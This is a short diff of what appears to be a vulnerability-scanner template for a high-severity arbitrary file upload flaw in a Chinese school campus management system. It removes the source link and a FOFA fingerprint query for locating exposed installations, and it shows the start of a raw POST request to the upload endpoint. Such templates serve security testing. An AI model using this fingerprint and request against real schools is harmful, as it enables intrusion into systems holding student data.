@@ -3,12 +3,8 @@ info:
   name: 新中新中小学智慧校园信息管理系统PSE存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vg9hygcbk4mlp8ld'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vg9hygcbk4mlp8ld
-    fofa: body="/Login/IndexMobi"
 http:
 - raw:
   - 'POST /PSE/Upload HTTP/1.1
